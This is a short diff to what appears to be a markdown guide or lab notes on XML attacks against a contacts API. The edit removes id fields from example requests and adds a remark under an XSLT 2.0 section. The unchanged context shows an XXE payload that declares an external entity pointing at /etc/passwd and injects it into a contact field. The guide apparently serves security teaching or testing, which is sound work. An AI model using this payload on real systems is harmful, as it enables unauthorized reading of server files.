@@ -28,7 +28,6 @@ Content-Type: application/xml
 Accept: application/xml
 
 <contact>  
-    <id>1</id>
     <firstName>yo</firstName>
     <lastName>lo</lastName>
     <email>yo@lo.no</email>
@@ -68,7 +67,6 @@ Accept: application/xml
     <!ENTITY content SYSTEM "file:/etc/passwd">
 ]>
 <contact>  
-    <id>1</id>
     <firstName>&content;</firstName>
     <lastName>lo</lastName>
     <email>yo@lo.no</email>
@@ -76,6 +74,8 @@ Accept: application/xml
 ```
 
 ## XSLT 2.0
+
+You have to run at least one normal request first.
 
 ```
 POST /api/contacts/1/html HTTP/1.1
